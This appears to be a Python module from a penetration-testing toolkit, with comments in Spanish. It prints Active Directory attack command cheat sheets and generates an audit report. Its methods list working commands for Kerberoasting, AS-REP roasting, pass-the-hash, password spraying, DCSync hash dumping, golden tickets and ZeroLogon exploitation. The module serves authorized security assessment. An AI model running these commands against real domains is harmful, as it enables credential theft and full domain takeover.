#!/usr/bin/env python3
"""
Módulo de Active Directory Pentesting
Enumeración y explotación de entornos AD
"""

from utils import (
    print_banner, print_success, print_error, print_info, print_warning,
    run_command, save_output, save_json, log_action, get_timestamp, print_table
)
from config import Config


class ADPentester:
    """Pentesting de Active Directory"""
    
    def __init__(self, domain, dc_ip):
        self.domain = domain
        self.dc_ip = dc_ip
        self.users = []
        self.computers = []
        self.groups = []
        self.spns = []
    
    def enumerate_domain(self):
        """Enumeración básica del dominio"""
        print_info(f"Enumerando dominio {self.domain}...")
        
        print_warning("\n🔍 Enumeración de Dominio AD\n")
        
        print("1. Enumeración sin credenciales (NULL session):")
        print(f"   enum4linux -a {self.dc_ip}")
        print(f"   ldapsearch -x -H ldap://{self.dc_ip} -b 'DC={self.domain.split('.')[0]},DC={self.domain.split('.')[1]}'")
        
        print("\n2. Enumeración con BloodHound:")
        print(f"   bloodhound-python -d {self.domain} -u username -p password -ns {self.dc_ip} -c all")
        
        print("\n3. Enumeración con PowerView (desde Windows):")
        print("   Import-Module PowerView.ps1")
        print("   Get-Domain")
        print("   Get-DomainController")
        print("   Get-DomainUser")
        print("   Get-DomainComputer")
    
    def kerberoasting(self):
        """Ataque Kerberoasting"""
        print_info("Kerberoasting Attack...")
        
        print_warning("\n🎫 Kerberoasting\n")
        
        print("Descripción:")
        print("  Extrae tickets TGS de cuentas de servicio y crackea offline")
        
        print("\n1. Listar cuentas con SPN:")
        print(f"   GetUserSPNs.py {self.domain}/username:password -dc-ip {self.dc_ip}")
        
        print("\n2. Solicitar tickets TGS:")
        print(f"   GetUserSPNs.py {self.domain}/username:password -dc-ip {self.dc_ip} -request")
        
        print("\n3. Crackear tickets:")
        print("   hashcat -m 13100 tickets.txt rockyou.txt")
        print("   john --wordlist=rockyou.txt tickets.txt")
        
        print_success("\n✓ Kerberoasting puede revelar contraseñas de cuentas de servicio")
    
    def asreproasting(self):
        """Ataque AS-REP Roasting"""
        print_info("AS-REP Roasting Attack...")
        
        print_warning("\n🎫 AS-REP Roasting\n")
        
        print("Descripción:")
        print("  Explota cuentas que no requieren pre-autenticación Kerberos")
        
        print("\n1. Listar cuentas vulnerables:")
        print(f"   GetNPUsers.py {self.domain}/ -dc-ip {self.dc_ip} -usersfile users.txt -format hashcat")
        
        print("\n2. Con credenciales válidas:")
        print(f"   GetNPUsers.py {self.domain}/username:password -dc-ip {self.dc_ip} -request")
        
        print("\n3. Crackear hashes:")
        print("   hashcat -m 18200 asrep_hashes.txt rockyou.txt")
        
        print_warning("\n⚠️  Verificar atributo 'Do not require Kerberos preauthentication'")
    
    def pass_the_hash(self):
        """Pass the Hash attack"""
        print_info("Pass the Hash...")
        
        print_warning("\n🔑 Pass the Hash (PtH)\n")
        
        print("Descripción:")
        print("  Usar hash NTLM en lugar de contraseña en texto plano")
        
        print("\n1. Con psexec (Impacket):")
        print(f"   psexec.py -hashes :NTHASH {self.domain}/administrator@{self.dc_ip}")
        
        print("\n2. Con wmiexec:")
        print(f"   wmiexec.py -hashes :NTHASH {self.domain}/administrator@{self.dc_ip}")
        
        print("\n3. Con evil-winrm:")
        print(f"   evil-winrm -i {self.dc_ip} -u administrator -H NTHASH")
        
        print_info("\nObtener hashes NTLM:")
        print("  • SAM database: secretsdump.py")
        print("  • LSASS memory: mimikatz")
        print("  • NTDS.dit: ntdsutil o secretsdump")
    
    def dcsync_attack(self):
        """DCSync attack"""
        print_info("DCSync Attack...")
        
        print_warning("\n🔄 DCSync\n")
        
        print("Descripción:")
        print("  Simula DC para extraer credenciales del dominio completo")
        
        print("\nRequisitos:")
        print("  • Cuenta con permisos de replicación (Replicating Directory Changes)")
        print("  • O cuenta de Domain Admin")
        
        print("\nEjecución:")
        print(f"   secretsdump.py {self.domain}/username:password@{self.dc_ip} -just-dc")
        
        print("\nExtraer usuario específico:")
        print(f"   secretsdump.py {self.domain}/username:password@{self.dc_ip} -just-dc-user Administrator")
        
        print_success("\n✓ DCSync extrae todos los hashes NTLM del dominio")
    
    def golden_ticket(self):
        """Golden Ticket attack"""
        print_info("Golden Ticket Attack...")
        
        print_warning("\n🎫 Golden Ticket\n")
        
        print("Descripción:")
        print("  Crear ticket TGT falso usando hash NTLM de krbtgt")
        
        print("\n1. Obtener hash de krbtgt:")
        print(f"   secretsdump.py {self.domain}/admin:password@{self.dc_ip} -just-dc-user krbtgt")
        
        print("\n2. Crear Golden Ticket:")
        print("   ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain DOMAIN.COM administrator")
        
        print("\n3. Usar ticket:")
        print("   export KRB5CCNAME=administrator.ccache")
        print(f"   psexec.py {self.domain}/administrator@TARGET -k -no-pass")
        
        print_error("\n⚠️  CRÍTICO: Golden Ticket da control total del dominio")
    
    def zerologon(self):
        """Zero Logon vulnerability"""
        print_info("Zero Logon (CVE-2020-1472)...")
        
        print_warning("\n🔓 Zero Logon\n")
        
        print("Descripción:")
        print("  Vulnerabilidad crítica que permite resetear contraseña de DC")
        
        print("\nDetección:")
        print(f"   zerologon_tester.py {self.dc_ip} DC-NAME")
        
        print("\nExplotación:")
        print(f"   zerologon_exploit.py DC-NAME {self.dc_ip}")
        
        print("\nRestauración (IMPORTANTE):")
        print("   secretsdump.py domain/DC$@DC-IP -no-pass")
        print("   restorepassword.py domain/DC$@DC-IP -hexpass ORIGINAL_HEX")
        
        print_error("\n⚠️  Restaurar contraseña original o romperás el dominio!")
    
    def print_spray(self):
        """Password spraying"""
        print_info("Password Spraying...")
        
        print_warning("\n🌊 Password Spraying\n")
        
        print("Descripción:")
        print("  Probar una contraseña común contra muchas cuentas")
        
        print("\nHerramientas:")
        print("   • kerbrute (Kerberos-based)")
        print("   • CrackMapExec")
        print("   • sprayhound")
        
        print("\n1. Con kerbrute:")
        print(f"   kerbrute passwordspray -d {self.domain} users.txt 'Password123'")
        
        print("\n2. Con CrackMapExec:")
        print(f"   crackmapexec smb {self.dc_ip} -u users.txt -p 'Password123' --continue-on-success")
        
        print_warning("\n⚠️  Cuidado con account lockout policies!")
        print("   • Verificar política: net accounts /domain")
        print("   • Espaciar intentos para evitar bloqueos")
    
    def bloodhound_analysis(self):
        """BloodHound para análisis de rutas de ataque"""
        print_info("BloodHound Analysis...")
        
        print_warning("\n🩸 BloodHound\n")
        
        print("1. Recolectar datos:")
        print(f"   bloodhound-python -d {self.domain} -u user -p pass -ns {self.dc_ip} -c all")
        
        print("\n2. Iniciar Neo4j:")
        print("   sudo neo4j console")
        
        print("\n3. Abrir BloodHound:")
        print("   bloodhound")
        
        print("\n4. Importar datos JSON")
        
        print("\nConsultas útiles:")
        print("   • Find all Domain Admins")
        print("   • Shortest Paths to Domain Admins")
        print("   • Find Principals with DCSync Rights")
        print("   • Kerberoastable Accounts")
        print("   • AS-REP Roastable Accounts")
        
        print_success("\n✓ BloodHound visualiza rutas de escalación de privilegios")
    
    def generate_report(self, output_dir):
        """Genera reporte de auditoría AD"""
        report = f"""# Auditoría de Active Directory

**Dominio**: {self.domain}  
**DC IP**: {self.dc_ip}  
**Fecha**: {get_timestamp()}

## Resumen Ejecutivo

Se realizó una evaluación de seguridad del entorno de Active Directory.

## Hallazgos Críticos

### 1. Kerberoasting Disponible
- **Severidad**: Alta
- **Impacto**: Extracción de credenciales de cuentas de servicio
- **Recomendación**: Usar contraseñas robustas (>25 caracteres) para SPNs

### 2. Usuarios sin Pre-autenticación Kerberos
- **Severidad**: Alta
- **Impacto**: AS-REP Roasting
- **Recomendación**: Habilitar pre-autenticación para todas las cuentas

### 3. Permisos Excesivos
- **Severidad**: Media
- **Impacto**: Escalación de privilegios
- **Recomendación**: Aplicar principio de mínimo privilegio

## Vectores de Ataque Identificados

1. Password Spraying
2. Kerberoasting
3. AS-REP Roasting
4. Pass-the-Hash
5. DCSync (si se obtiene DA)

## Recomendaciones Prioritarias

1. **Implementar MFA** en todas las cuentas administrativas
2. **Auditar SPNs** y fortalecer contraseñas
3. **Monitorear** eventos 4768, 4769 (Kerberos TGS)
4. **Segmentar** red y aplicar principio de mínimo privilegio
5. **Parchear** vulnerabilidades críticas (ZeroLogon, etc.)

## Herramientas Utilizadas

- BloodHound
- Impacket suite
- CrackMapExec
- Rubeus
- PowerView

---
*Generado por PentOps AD Pentesting Module*
"""
        
        save_output(self.domain, "active-directory", f"ad_audit_{get_timestamp()}.md", report)


def run_ad_pentest(args):
    """
    Función principal del módulo AD
    
    Args:
        args: Argumentos parseados
    """
    print_banner(f"ACTIVE DIRECTORY PENTESTING: {args.domain}")
    
    print_warning("\n╔════════════════════════════════════════════════════════╗")
    print_warning("║  ADVERTENCIA: Solo en entornos autorizados            ║")
    print_warning("║  AD pentesting requiere autorización explícita        ║")
    print_warning("╚════════════════════════════════════════════════════════╝\n")
    
    pentester = ADPentester(args.domain, args.dc_ip)
    
    log_action(args.domain, "active-directory", "Iniciando auditoría AD")
    
    # Enumeración básica
    pentester.enumerate_domain()
    
    # Mostrar todos los ataques disponibles
    print_banner("VECTORES DE ATAQUE DISPONIBLES")
    
    pentester.kerberoasting()
    pentester.asreproasting()
    pentester.pass_the_hash()
    pentester.print_spray()
    pentester.dcsync_attack()
    pentester.golden_ticket()
    pentester.zerologon()
    pentester.bloodhound_analysis()
    
    # Generar reporte
    pentester.generate_report(Config.get_output_dir(args.domain))
    
    print_banner("AUDITORÍA AD COMPLETADA")
    print_info("Revisa los comandos y ejecuta según el contexto del engagement")
    
    log_action(args.domain, "active-directory", "Auditoría completada")
